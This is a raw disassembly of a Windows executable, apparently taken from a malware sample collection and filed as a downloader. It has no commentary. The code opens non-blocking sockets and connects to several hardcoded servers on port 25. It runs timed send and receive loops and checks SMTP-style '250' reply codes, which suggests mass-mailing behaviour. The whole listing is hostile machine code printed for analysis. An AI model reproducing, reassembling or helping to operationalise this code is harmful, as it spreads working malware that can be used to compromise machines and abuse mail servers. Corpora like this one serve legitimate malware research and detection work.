
malware_samples/downloader/7b2f8c43b4c92fb2add9fce264e92668dac2530493c51c5d6b45dcb764e208ed.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	53                   	push   %ebx
  401001:	56                   	push   %esi
  401002:	57                   	push   %edi
  401003:	8b 35 30 8e 40 00    	mov    0x408e30,%esi
  401009:	85 f6                	test   %esi,%esi
  40100b:	74 1b                	je     0x401028
  40100d:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401011:	8b 1d a4 70 40 00    	mov    0x4070a4,%ebx
  401017:	8d 46 08             	lea    0x8(%esi),%eax
  40101a:	57                   	push   %edi
  40101b:	50                   	push   %eax
  40101c:	ff d3                	call   *%ebx
  40101e:	85 c0                	test   %eax,%eax
  401020:	74 0c                	je     0x40102e
  401022:	8b 36                	mov    (%esi),%esi
  401024:	85 f6                	test   %esi,%esi
  401026:	75 ef                	jne    0x401017
  401028:	5f                   	pop    %edi
  401029:	5e                   	pop    %esi
  40102a:	33 c0                	xor    %eax,%eax
  40102c:	5b                   	pop    %ebx
  40102d:	c3                   	ret
  40102e:	8b c6                	mov    %esi,%eax
  401030:	5f                   	pop    %edi
  401031:	5e                   	pop    %esi
  401032:	5b                   	pop    %ebx
  401033:	c3                   	ret
  401034:	90                   	nop
  401035:	90                   	nop
  401036:	90                   	nop
  401037:	90                   	nop
  401038:	90                   	nop
  401039:	90                   	nop
  40103a:	90                   	nop
  40103b:	90                   	nop
  40103c:	90                   	nop
  40103d:	90                   	nop
  40103e:	90                   	nop
  40103f:	90                   	nop
  401040:	81 ec 04 01 00 00    	sub    $0x104,%esp
  401046:	53                   	push   %ebx
  401047:	57                   	push   %edi
  401048:	b9 40 00 00 00       	mov    $0x40,%ecx
  40104d:	33 c0                	xor    %eax,%eax
  40104f:	8d 7c 24 09          	lea    0x9(%esp),%edi
  401053:	c6 44 24 08 00       	movb   $0x0,0x8(%esp)
  401058:	f3 ab                	rep stos %eax,%es:(%edi)
  40105a:	79 b4                	jns    0x401010
  40105c:	aa                   	stos   %al,%es:(%edi)
  40105d:	8d 44 24 08          	lea    0x8(%esp),%eax
  401061:	68 04 01 00 00       	push   $0x104
  401066:	50                   	push   %eax
  401067:	bb 54 96 40 00       	mov    $0x409654,%ebx
  40106c:	e8 e5 25 00 00       	call   0x403656
  401071:	85 c0                	test   %eax,%eax
  401073:	0f 85 90 00 00 00    	jne    0x401109
  401079:	55                   	push   %ebp
  40107a:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40107e:	56                   	push   %esi
  40107f:	51                   	push   %ecx
  401080:	e8 cb 25 00 00       	call   0x403650
  401085:	8b e8                	mov    %eax,%ebp
  401087:	85 ed                	test   %ebp,%ebp
  401089:	74 6e                	je     0x4010f9
  40108b:	8b 55 0c             	mov    0xc(%ebp),%edx
  40108e:	83 3a 00             	cmpl   $0x0,(%edx)
  401091:	74 66                	je     0x4010f9
  401093:	33 f6                	xor    %esi,%esi
  401095:	bf 54 96 40 00       	mov    $0x409654,%edi
  40109a:	83 c9 ff             	or     $0xffffffff,%ecx
  40109d:	33 c0                	xor    %eax,%eax
  40109f:	f2 ae                	repnz scas %es:(%edi),%al
  4010a1:	f7 d1                	not    %ecx
  4010a3:	49                   	dec    %ecx
  4010a4:	81 f9 f4 00 00 00    	cmp    $0xf4,%ecx
  4010aa:	73 4d                	jae    0x4010f9
  4010ac:	8b 04 16             	mov    (%esi,%edx,1),%eax
  4010af:	33 d2                	xor    %edx,%edx
  4010b1:	33 c9                	xor    %ecx,%ecx
  4010b3:	8a 50 03             	mov    0x3(%eax),%dl
  4010b6:	8a 48 02             	mov    0x2(%eax),%cl
  4010b9:	52                   	push   %edx
  4010ba:	51                   	push   %ecx
  4010bb:	33 d2                	xor    %edx,%edx
  4010bd:	33 c9                	xor    %ecx,%ecx
  4010bf:	8a 50 01             	mov    0x1(%eax),%dl
  4010c2:	8a 08                	mov    (%eax),%cl
  4010c4:	52                   	push   %edx
  4010c5:	51                   	push   %ecx
  4010c6:	68 94 83 40 00       	push   $0x408394
  4010cb:	53                   	push   %ebx
  4010cc:	ff 15 38 71 40 00    	call   *0x407138
  4010d2:	bf 54 96 40 00       	mov    $0x409654,%edi
  4010d7:	83 c9 ff             	or     $0xffffffff,%ecx
  4010da:	33 c0                	xor    %eax,%eax
  4010dc:	83 c4 18             	add    $0x18,%esp
  4010df:	f2 ae                	repnz scas %es:(%edi),%al
  4010e1:	8b 55 0c             	mov    0xc(%ebp),%edx
  4010e4:	83 c6 04             	add    $0x4,%esi
  4010e7:	f7 d1                	not    %ecx
  4010e9:	8b 04 16             	mov    (%esi,%edx,1),%eax
  4010ec:	49                   	dec    %ecx
  4010ed:	81 c1 54 96 40 00    	add    $0x409654,%ecx
  4010f3:	85 c0                	test   %eax,%eax
  4010f5:	8b d9                	mov    %ecx,%ebx
  4010f7:	75 9c                	jne    0x401095
  4010f9:	5e                   	pop    %esi
  4010fa:	5d                   	pop    %ebp
  4010fb:	5f                   	pop    %edi
  4010fc:	b8 01 00 00 00       	mov    $0x1,%eax
  401101:	5b                   	pop    %ebx
  401102:	81 c4 04 01 00 00    	add    $0x104,%esp
  401108:	c3                   	ret
  401109:	5f                   	pop    %edi
  40110a:	33 c0                	xor    %eax,%eax
  40110c:	5b                   	pop    %ebx
  40110d:	81 c4 04 01 00 00    	add    $0x104,%esp
  401113:	c3                   	ret
  401114:	90                   	nop
  401115:	90                   	nop
  401116:	90                   	nop
  401117:	90                   	nop
  401118:	90                   	nop
  401119:	90                   	nop
  40111a:	90                   	nop
  40111b:	90                   	nop
  40111c:	90                   	nop
  40111d:	90                   	nop
  40111e:	90                   	nop
  40111f:	90                   	nop
  401120:	81 ec 20 01 00 00    	sub    $0x120,%esp
  401126:	8b 84 24 24 01 00 00 	mov    0x124(%esp),%eax
  40112d:	56                   	push   %esi
  40112e:	50                   	push   %eax
  40112f:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  401136:	00 
  401137:	e8 14 25 00 00       	call   0x403650
  40113c:	85 c0                	test   %eax,%eax
  40113e:	0f 84 8a 00 00 00    	je     0x4011ce
  401144:	8b 48 0c             	mov    0xc(%eax),%ecx
  401147:	8b 11                	mov    (%ecx),%edx
  401149:	8b 8c 24 2c 01 00 00 	mov    0x12c(%esp),%ecx
  401150:	51                   	push   %ecx
  401151:	8b 02                	mov    (%edx),%eax
  401153:	89 44 24 18          	mov    %eax,0x18(%esp)
  401157:	e8 1e 25 00 00       	call   0x40367a
  40115c:	6a 06                	push   $0x6
  40115e:	6a 01                	push   $0x1
  401160:	6a 02                	push   $0x2
  401162:	66 89 44 24 1e       	mov    %ax,0x1e(%esp)
  401167:	66 c7 44 24 1c 02 00 	movw   $0x2,0x1c(%esp)
  40116e:	e8 01 25 00 00       	call   0x403674
  401173:	8d 54 24 04          	lea    0x4(%esp),%edx
  401177:	8b f0                	mov    %eax,%esi
  401179:	52                   	push   %edx
  40117a:	68 7e 66 04 80       	push   $0x8004667e
  40117f:	56                   	push   %esi
  401180:	e8 e9 24 00 00       	call   0x40366e
  401185:	8d 44 24 10          	lea    0x10(%esp),%eax
  401189:	6a 10                	push   $0x10
  40118b:	50                   	push   %eax
  40118c:	56                   	push   %esi
  40118d:	89 74 24 30          	mov    %esi,0x30(%esp)
  401191:	c7 44 24 2c 01 00 00 	movl   $0x1,0x2c(%esp)
  401198:	00 
  401199:	c7 44 24 14 1e 00 00 	movl   $0x1e,0x14(%esp)
  4011a0:	00 
  4011a1:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4011a8:	00 
  4011a9:	e8 ba 24 00 00       	call   0x403668
  4011ae:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4011b2:	8d 54 24 20          	lea    0x20(%esp),%edx
  4011b6:	51                   	push   %ecx
  4011b7:	6a 00                	push   $0x0
  4011b9:	52                   	push   %edx
  4011ba:	6a 00                	push   $0x0
  4011bc:	6a 00                	push   $0x0
  4011be:	e8 9f 24 00 00       	call   0x403662
  4011c3:	83 f8 01             	cmp    $0x1,%eax
  4011c6:	7d 11                	jge    0x4011d9
  4011c8:	56                   	push   %esi
  4011c9:	e8 8e 24 00 00       	call   0x40365c
  4011ce:	83 c8 ff             	or     $0xffffffff,%eax
  4011d1:	5e                   	pop    %esi
  4011d2:	81 c4 20 01 00 00    	add    $0x120,%esp
  4011d8:	c3                   	ret
  4011d9:	8b c6                	mov    %esi,%eax
  4011db:	5e                   	pop    %esi
  4011dc:	81 c4 20 01 00 00    	add    $0x120,%esp
  4011e2:	c3                   	ret
  4011e3:	90                   	nop
  4011e4:	90                   	nop
  4011e5:	90                   	nop
  4011e6:	90                   	nop
  4011e7:	90                   	nop
  4011e8:	90                   	nop
  4011e9:	90                   	nop
  4011ea:	90                   	nop
  4011eb:	90                   	nop
  4011ec:	90                   	nop
  4011ed:	90                   	nop
  4011ee:	90                   	nop
  4011ef:	90                   	nop
  4011f0:	51                   	push   %ecx
  4011f1:	53                   	push   %ebx
  4011f2:	55                   	push   %ebp
  4011f3:	56                   	push   %esi
  4011f4:	57                   	push   %edi
  4011f5:	ff 15 9c 70 40 00    	call   *0x40709c
  4011fb:	8b 74 24 20          	mov    0x20(%esp),%esi
  4011ff:	33 ff                	xor    %edi,%edi
  401201:	85 f6                	test   %esi,%esi
  401203:	89 44 24 10          	mov    %eax,0x10(%esp)
  401207:	7e 45                	jle    0x40124e
  401209:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  40120d:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  401211:	ff 15 9c 70 40 00    	call   *0x40709c
  401217:	2b 44 24 10          	sub    0x10(%esp),%eax
  40121b:	3d 60 ea 00 00       	cmp    $0xea60,%eax
  401220:	77 34                	ja     0x401256
  401222:	6a 00                	push   $0x0
  401224:	8d 04 1f             	lea    (%edi,%ebx,1),%eax
  401227:	56                   	push   %esi
  401228:	50                   	push   %eax
  401229:	55                   	push   %ebp
  40122a:	e8 57 24 00 00       	call   0x403686
  40122f:	85 c0                	test   %eax,%eax
  401231:	74 23                	je     0x401256
  401233:	83 f8 ff             	cmp    $0xffffffff,%eax
  401236:	75 0e                	jne    0x401246
  401238:	e8 43 24 00 00       	call   0x403680
  40123d:	3d 33 27 00 00       	cmp    $0x2733,%eax
  401242:	75 12                	jne    0x401256
  401244:	eb 04                	jmp    0x40124a
  401246:	2b f0                	sub    %eax,%esi
  401248:	03 f8                	add    %eax,%edi
  40124a:	85 f6                	test   %esi,%esi
  40124c:	7f c3                	jg     0x401211
  40124e:	8b c7                	mov    %edi,%eax
  401250:	5f                   	pop    %edi
  401251:	5e                   	pop    %esi
  401252:	5d                   	pop    %ebp
  401253:	5b                   	pop    %ebx
  401254:	59                   	pop    %ecx
  401255:	c3                   	ret
  401256:	5f                   	pop    %edi
  401257:	5e                   	pop    %esi
  401258:	5d                   	pop    %ebp
  401259:	83 c8 ff             	or     $0xffffffff,%eax
  40125c:	5b                   	pop    %ebx
  40125d:	59                   	pop    %ecx
  40125e:	c3                   	ret
  40125f:	90                   	nop
  401260:	51                   	push   %ecx
  401261:	53                   	push   %ebx
  401262:	55                   	push   %ebp
  401263:	56                   	push   %esi
  401264:	57                   	push   %edi
  401265:	ff 15 9c 70 40 00    	call   *0x40709c
  40126b:	8b 7c 24 20          	mov    0x20(%esp),%edi
  40126f:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  401273:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  401277:	89 44 24 10          	mov    %eax,0x10(%esp)
  40127b:	ff 15 9c 70 40 00    	call   *0x40709c
  401281:	2b 44 24 10          	sub    0x10(%esp),%eax
  401285:	3d 60 ea 00 00       	cmp    $0xea60,%eax
  40128a:	77 2d                	ja     0x4012b9
  40128c:	6a 00                	push   $0x0
  40128e:	57                   	push   %edi
  40128f:	53                   	push   %ebx
  401290:	55                   	push   %ebp
  401291:	e8 f6 23 00 00       	call   0x40368c
  401296:	8b f0                	mov    %eax,%esi
  401298:	85 f6                	test   %esi,%esi
  40129a:	74 1d                	je     0x4012b9
  40129c:	83 fe ff             	cmp    $0xffffffff,%esi
  40129f:	75 0c                	jne    0x4012ad
  4012a1:	e8 da 23 00 00       	call   0x403680
  4012a6:	3d 33 27 00 00       	cmp    $0x2733,%eax
  4012ab:	75 0c                	jne    0x4012b9
  4012ad:	85 f6                	test   %esi,%esi
  4012af:	7c ca                	jl     0x40127b
  4012b1:	8b c6                	mov    %esi,%eax
  4012b3:	5f                   	pop    %edi
  4012b4:	5e                   	pop    %esi
  4012b5:	5d                   	pop    %ebp
  4012b6:	5b                   	pop    %ebx
  4012b7:	59                   	pop    %ecx
  4012b8:	c3                   	ret
  4012b9:	5f                   	pop    %edi
  4012ba:	5e                   	pop    %esi
  4012bb:	5d                   	pop    %ebp
  4012bc:	83 c8 ff             	or     $0xffffffff,%eax
  4012bf:	5b                   	pop    %ebx
  4012c0:	59                   	pop    %ecx
  4012c1:	c3                   	ret
  4012c2:	90                   	nop
  4012c3:	90                   	nop
  4012c4:	90                   	nop
  4012c5:	90                   	nop
  4012c6:	90                   	nop
  4012c7:	90                   	nop
  4012c8:	90                   	nop
  4012c9:	90                   	nop
  4012ca:	90                   	nop
  4012cb:	90                   	nop
  4012cc:	90                   	nop
  4012cd:	90                   	nop
  4012ce:	90                   	nop
  4012cf:	90                   	nop
  4012d0:	56                   	push   %esi
  4012d1:	57                   	push   %edi
  4012d2:	33 f6                	xor    %esi,%esi
  4012d4:	a1 30 8e 40 00       	mov    0x408e30,%eax
  4012d9:	33 c9                	xor    %ecx,%ecx
  4012db:	85 c0                	test   %eax,%eax
  4012dd:	74 26                	je     0x401305
  4012df:	8b 50 5c             	mov    0x5c(%eax),%edx
  4012e2:	85 d2                	test   %edx,%edx
  4012e4:	75 10                	jne    0x4012f6
  4012e6:	85 f6                	test   %esi,%esi
  4012e8:	74 0a                	je     0x4012f4
  4012ea:	8b 56 58             	mov    0x58(%esi),%edx
  4012ed:	8b 78 58             	mov    0x58(%eax),%edi
  4012f0:	3b d7                	cmp    %edi,%edx
  4012f2:	73 02                	jae    0x4012f6
  4012f4:	8b f0                	mov    %eax,%esi
  4012f6:	8b 00                	mov    (%eax),%eax
  4012f8:	41                   	inc    %ecx
  4012f9:	85 c0                	test   %eax,%eax
  4012fb:	75 e2                	jne    0x4012df
  4012fd:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  401303:	7f 64                	jg     0x401369
  401305:	6a 60                	push   $0x60
  401307:	6a 00                	push   $0x0
  401309:	ff 15 90 70 40 00    	call   *0x407090
  40130f:	50                   	push   %eax
  401310:	ff 15 94 70 40 00    	call   *0x407094
  401316:	8b f0                	mov    %eax,%esi
  401318:	85 f6                	test   %esi,%esi
  40131a:	75 08                	jne    0x401324
  40131c:	5f                   	pop    %edi
  40131d:	b8 01 00 00 00       	mov    $0x1,%eax
  401322:	5e                   	pop    %esi
  401323:	c3                   	ret
  401324:	b9 18 00 00 00       	mov    $0x18,%ecx
  401329:	33 c0                	xor    %eax,%eax
  40132b:	8b fe                	mov    %esi,%edi
  40132d:	6a 4f                	push   $0x4f
  40132f:	f3 ab                	rep stos %eax,%es:(%edi)
  401331:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401335:	8b 44 24 14          	mov    0x14(%esp),%eax
  401339:	8d 56 08             	lea    0x8(%esi),%edx
  40133c:	51                   	push   %ecx
  40133d:	52                   	push   %edx
  40133e:	89 46 04             	mov    %eax,0x4(%esi)
  401341:	ff 15 98 70 40 00    	call   *0x407098
  401347:	ff 15 9c 70 40 00    	call   *0x40709c
  40134d:	89 46 58             	mov    %eax,0x58(%esi)
  401350:	c7 46 5c 00 00 00 00 	movl   $0x0,0x5c(%esi)
  401357:	a1 30 8e 40 00       	mov    0x408e30,%eax
  40135c:	89 06                	mov    %eax,(%esi)
  40135e:	89 35 30 8e 40 00    	mov    %esi,0x408e30
  401364:	5f                   	pop    %edi
  401365:	33 c0                	xor    %eax,%eax
  401367:	5e                   	pop    %esi
  401368:	c3                   	ret
  401369:	85 f6                	test   %esi,%esi
  40136b:	75 08                	jne    0x401375
  40136d:	5f                   	pop    %edi
  40136e:	b8 01 00 00 00       	mov    $0x1,%eax
  401373:	5e                   	pop    %esi
  401374:	c3                   	ret
  401375:	8b 46 5c             	mov    0x5c(%esi),%eax
  401378:	85 c0                	test   %eax,%eax
  40137a:	74 08                	je     0x401384
  40137c:	5f                   	pop    %edi
  40137d:	b8 01 00 00 00       	mov    $0x1,%eax
  401382:	5e                   	pop    %esi
  401383:	c3                   	ret
  401384:	8d 7e 08             	lea    0x8(%esi),%edi
  401387:	c7 46 5c 01 00 00 00 	movl   $0x1,0x5c(%esi)
  40138e:	c6 07 00             	movb   $0x0,(%edi)
  401391:	ff 15 9c 70 40 00    	call   *0x40709c
  401397:	8b 4e 04             	mov    0x4(%esi),%ecx
  40139a:	89 46 58             	mov    %eax,0x58(%esi)
  40139d:	51                   	push   %ecx
  40139e:	e8 7d 22 00 00       	call   0x403620
  4013a3:	8b 54 24 10          	mov    0x10(%esp),%edx
  4013a7:	83 c4 04             	add    $0x4,%esp
  4013aa:	6a 4f                	push   $0x4f
  4013ac:	52                   	push   %edx
  4013ad:	57                   	push   %edi
  4013ae:	ff 15 98 70 40 00    	call   *0x407098
  4013b4:	8b 44 24 10          	mov    0x10(%esp),%eax
  4013b8:	c7 46 5c 00 00 00 00 	movl   $0x0,0x5c(%esi)
  4013bf:	89 46 04             	mov    %eax,0x4(%esi)
  4013c2:	5f                   	pop    %edi
  4013c3:	33 c0                	xor    %eax,%eax
  4013c5:	5e                   	pop    %esi
  4013c6:	c3                   	ret
  4013c7:	90                   	nop
  4013c8:	90                   	nop
  4013c9:	90                   	nop
  4013ca:	90                   	nop
  4013cb:	90                   	nop
  4013cc:	90                   	nop
  4013cd:	90                   	nop
  4013ce:	90                   	nop
  4013cf:	90                   	nop
  4013d0:	56                   	push   %esi
  4013d1:	8b 74 24 08          	mov    0x8(%esp),%esi
  4013d5:	57                   	push   %edi
  4013d6:	56                   	push   %esi
  4013d7:	e8 24 fc ff ff       	call   0x401000
  4013dc:	83 c4 04             	add    $0x4,%esp
  4013df:	85 c0                	test   %eax,%eax
  4013e1:	75 35                	jne    0x401418
  4013e3:	56                   	push   %esi
  4013e4:	e8 e7 1f 00 00       	call   0x4033d0
  4013e9:	8b f8                	mov    %eax,%edi
  4013eb:	83 c4 04             	add    $0x4,%esp
  4013ee:	85 ff                	test   %edi,%edi
  4013f0:	75 0f                	jne    0x401401
  4013f2:	ff 15 9c 70 40 00    	call   *0x40709c
  4013f8:	a8 03                	test   $0x3,%al
  4013fa:	74 05                	je     0x401401
  4013fc:	5f                   	pop    %edi
  4013fd:	33 c0                	xor    %eax,%eax
  4013ff:	5e                   	pop    %esi
  401400:	c3                   	ret
  401401:	57                   	push   %edi
  401402:	56                   	push   %esi
  401403:	e8 c8 fe ff ff       	call   0x4012d0
  401408:	56                   	push   %esi
  401409:	e8 f2 fb ff ff       	call   0x401000
  40140e:	83 c4 0c             	add    $0xc,%esp
  401411:	85 c0                	test   %eax,%eax
  401413:	75 03                	jne    0x401418
  401415:	5f                   	pop    %edi
  401416:	5e                   	pop    %esi
  401417:	c3                   	ret
  401418:	8b 48 5c             	mov    0x5c(%eax),%ecx
  40141b:	5f                   	pop    %edi
  40141c:	41                   	inc    %ecx
  40141d:	5e                   	pop    %esi
  40141e:	89 48 5c             	mov    %ecx,0x5c(%eax)
  401421:	c3                   	ret
  401422:	90                   	nop
  401423:	90                   	nop
  401424:	90                   	nop
  401425:	90                   	nop
  401426:	90                   	nop
  401427:	90                   	nop
  401428:	90                   	nop
  401429:	90                   	nop
  40142a:	90                   	nop
  40142b:	90                   	nop
  40142c:	90                   	nop
  40142d:	90                   	nop
  40142e:	90                   	nop
  40142f:	90                   	nop
  401430:	a1 40 96 40 00       	mov    0x409640,%eax
  401435:	83 ec 10             	sub    $0x10,%esp
  401438:	85 c0                	test   %eax,%eax
  40143a:	55                   	push   %ebp
  40143b:	56                   	push   %esi
  40143c:	74 28                	je     0x401466
  40143e:	8b 70 04             	mov    0x4(%eax),%esi
  401441:	85 f6                	test   %esi,%esi
  401443:	74 76                	je     0x4014bb
  401445:	8d 46 08             	lea    0x8(%esi),%eax
  401448:	6a 19                	push   $0x19
  40144a:	50                   	push   %eax
  40144b:	e8 d0 fc ff ff       	call   0x401120
  401450:	8b e8                	mov    %eax,%ebp
  401452:	83 c4 08             	add    $0x8,%esp
  401455:	83 fd ff             	cmp    $0xffffffff,%ebp
  401458:	75 6e                	jne    0x4014c8
  40145a:	8b 36                	mov    (%esi),%esi
  40145c:	85 f6                	test   %esi,%esi
  40145e:	75 e5                	jne    0x401445
  401460:	5e                   	pop    %esi
  401461:	5d                   	pop    %ebp
  401462:	83 c4 10             	add    $0x10,%esp
  401465:	c3                   	ret
  401466:	6a 19                	push   $0x19
  401468:	68 e0 81 40 00       	push   $0x4081e0
  40146d:	e8 ae fc ff ff       	call   0x401120
  401472:	8b e8                	mov    %eax,%ebp
  401474:	83 c4 08             	add    $0x8,%esp
  401477:	83 fd ff             	cmp    $0xffffffff,%ebp
  40147a:	75 4c                	jne    0x4014c8
  40147c:	6a 19                	push   $0x19
  40147e:	68 30 84 40 00       	push   $0x408430
  401483:	e8 98 fc ff ff       	call   0x401120
  401488:	8b e8                	mov    %eax,%ebp
  40148a:	83 c4 08             	add    $0x8,%esp
  40148d:	83 fd ff             	cmp    $0xffffffff,%ebp
  401490:	75 36                	jne    0x4014c8
  401492:	6a 19                	push   $0x19
  401494:	68 20 84 40 00       	push   $0x408420
  401499:	e8 82 fc ff ff       	call   0x401120
  40149e:	8b e8                	mov    %eax,%ebp
  4014a0:	83 c4 08             	add    $0x8,%esp
  4014a3:	83 fd ff             	cmp    $0xffffffff,%ebp
  4014a6:	75 20                	jne    0x4014c8
  4014a8:	6a 19                	push   $0x19
  4014aa:	68 10 84 40 00       	push   $0x408410
  4014af:	e8 6c fc ff ff       	call   0x401120
  4014b4:	83 c4 08             	add    $0x8,%esp
  4014b7:	8b e8                	mov    %eax,%ebp
  4014b9:	eb 04                	jmp    0x4014bf
  4014bb:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  4014bf:	83 fd ff             	cmp    $0xffffffff,%ebp
  4014c2:	0f 84 13 05 00 00    	je     0x4019db
  4014c8:	53                   	push   %ebx
  4014c9:	57                   	push   %edi
  4014ca:	68 00 04 00 00       	push   $0x400
  4014cf:	68 38 92 40 00       	push   $0x409238
  4014d4:	55                   	push   %ebp
  4014d5:	e8 86 fd ff ff       	call   0x401260
  4014da:	83 c4 0c             	add    $0xc,%esp
  4014dd:	83 f8 ff             	cmp    $0xffffffff,%eax
  4014e0:	0f 84 ed 04 00 00    	je     0x4019d3
  4014e6:	83 c9 ff             	or     $0xffffffff,%ecx
  4014e9:	bf 08 84 40 00       	mov    $0x408408,%edi
  4014ee:	33 c0                	xor    %eax,%eax
  4014f0:	f2 ae                	repnz scas %es:(%edi),%al
  4014f2:	f7 d1                	not    %ecx
  4014f4:	2b f9                	sub    %ecx,%edi
  4014f6:	8b d1                	mov    %ecx,%edx
  4014f8:	8b f7                	mov    %edi,%esi
  4014fa:	c1 e9 02             	shr    $0x2,%ecx
  4014fd:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  401502:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401504:	8b ca                	mov    %edx,%ecx
  401506:	83 e1 03             	and    $0x3,%ecx
  401509:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40150b:	bf 10 82 40 00       	mov    $0x408210,%edi
  401510:	83 c9 ff             	or     $0xffffffff,%ecx
  401513:	f2 ae                	repnz scas %es:(%edi),%al
  401515:	f7 d1                	not    %ecx
  401517:	2b f9                	sub    %ecx,%edi
  401519:	8b f7                	mov    %edi,%esi
  40151b:	8b d1                	mov    %ecx,%edx
  40151d:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  401522:	83 c9 ff             	or     $0xffffffff,%ecx
  401525:	f2 ae                	repnz scas %es:(%edi),%al
  401527:	8b ca                	mov    %edx,%ecx
  401529:	4f                   	dec    %edi
  40152a:	c1 e9 02             	shr    $0x2,%ecx
  40152d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40152f:	8b ca                	mov    %edx,%ecx
  401531:	83 e1 03             	and    $0x3,%ecx
  401534:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401536:	bf 04 84 40 00       	mov    $0x408404,%edi
  40153b:	83 c9 ff             	or     $0xffffffff,%ecx
  40153e:	f2 ae                	repnz scas %es:(%edi),%al
  401540:	f7 d1                	not    %ecx
  401542:	2b f9                	sub    %ecx,%edi
  401544:	8b f7                	mov    %edi,%esi
  401546:	8b d1                	mov    %ecx,%edx
  401548:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  40154d:	83 c9 ff             	or     $0xffffffff,%ecx
  401550:	f2 ae                	repnz scas %es:(%edi),%al
  401552:	8b ca                	mov    %edx,%ecx
  401554:	4f                   	dec    %edi
  401555:	c1 e9 02             	shr    $0x2,%ecx
  401558:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40155a:	8b ca                	mov    %edx,%ecx
  40155c:	83 e1 03             	and    $0x3,%ecx
  40155f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401561:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  401566:	83 c9 ff             	or     $0xffffffff,%ecx
  401569:	f2 ae                	repnz scas %es:(%edi),%al
  40156b:	f7 d1                	not    %ecx
  40156d:	49                   	dec    %ecx
  40156e:	51                   	push   %ecx
  40156f:	68 34 8e 40 00       	push   $0x408e34
  401574:	55                   	push   %ebp
  401575:	e8 76 fc ff ff       	call   0x4011f0
  40157a:	83 c4 0c             	add    $0xc,%esp
  40157d:	83 f8 ff             	cmp    $0xffffffff,%eax
  401580:	0f 84 4d 04 00 00    	je     0x4019d3
  401586:	68 00 04 00 00       	push   $0x400
  40158b:	68 38 92 40 00       	push   $0x409238
  401590:	55                   	push   %ebp
  401591:	e8 ca fc ff ff       	call   0x401260
  401596:	83 c4 0c             	add    $0xc,%esp
  401599:	83 f8 ff             	cmp    $0xffffffff,%eax
  40159c:	0f 84 31 04 00 00    	je     0x4019d3
  4015a2:	a0 38 92 40 00       	mov    0x409238,%al
  4015a7:	b3 30                	mov    $0x30,%bl
  4015a9:	3c 32                	cmp    $0x32,%al
  4015ab:	0f 85 dc 00 00 00    	jne    0x40168d
  4015b1:	80 3d 39 92 40 00 35 	cmpb   $0x35,0x409239
  4015b8:	0f 85 d4 03 00 00    	jne    0x401992
  4015be:	38 1d 3a 92 40 00    	cmp    %bl,0x40923a
  4015c4:	0f 85 28 02 00 00    	jne    0x4017f2
  4015ca:	83 c9 ff             	or     $0xffffffff,%ecx
  4015cd:	bf f8 83 40 00       	mov    $0x4083f8,%edi
  4015d2:	33 c0                	xor    %eax,%eax
  4015d4:	f2 ae                	repnz scas %es:(%edi),%al
  4015d6:	f7 d1                	not    %ecx
  4015d8:	2b f9                	sub    %ecx,%edi
  4015da:	8b c1                	mov    %ecx,%eax
  4015dc:	8b f7                	mov    %edi,%esi
  4015de:	c1 e9 02             	shr    $0x2,%ecx
  4015e1:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  4015e6:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4015e8:	8b c8                	mov    %eax,%ecx
  4015ea:	33 c0                	xor    %eax,%eax
  4015ec:	83 e1 03             	and    $0x3,%ecx
  4015ef:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4015f1:	bf fc 81 40 00       	mov    $0x4081fc,%edi
  4015f6:	83 c9 ff             	or     $0xffffffff,%ecx
  4015f9:	f2 ae                	repnz scas %es:(%edi),%al
  4015fb:	f7 d1                	not    %ecx
  4015fd:	2b f9                	sub    %ecx,%edi
  4015ff:	8b f7                	mov    %edi,%esi
  401601:	8b d1                	mov    %ecx,%edx
  401603:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  401608:	83 c9 ff             	or     $0xffffffff,%ecx
  40160b:	f2 ae                	repnz scas %es:(%edi),%al
  40160d:	8b ca                	mov    %edx,%ecx
  40160f:	4f                   	dec    %edi
  401610:	c1 e9 02             	shr    $0x2,%ecx
  401613:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401615:	8b ca                	mov    %edx,%ecx
  401617:	83 e1 03             	and    $0x3,%ecx
  40161a:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40161c:	bf 04 84 40 00       	mov    $0x408404,%edi
  401621:	83 c9 ff             	or     $0xffffffff,%ecx
  401624:	f2 ae                	repnz scas %es:(%edi),%al
  401626:	f7 d1                	not    %ecx
  401628:	2b f9                	sub    %ecx,%edi
  40162a:	8b f7                	mov    %edi,%esi
  40162c:	8b d1                	mov    %ecx,%edx
  40162e:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  401633:	83 c9 ff             	or     $0xffffffff,%ecx
  401636:	f2 ae                	repnz scas %es:(%edi),%al
  401638:	8b ca                	mov    %edx,%ecx
  40163a:	4f                   	dec    %edi
  40163b:	c1 e9 02             	shr    $0x2,%ecx
  40163e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401640:	8b ca                	mov    %edx,%ecx
  401642:	83 e1 03             	and    $0x3,%ecx
  401645:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401647:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  40164c:	83 c9 ff             	or     $0xffffffff,%ecx
  40164f:	f2 ae                	repnz scas %es:(%edi),%al
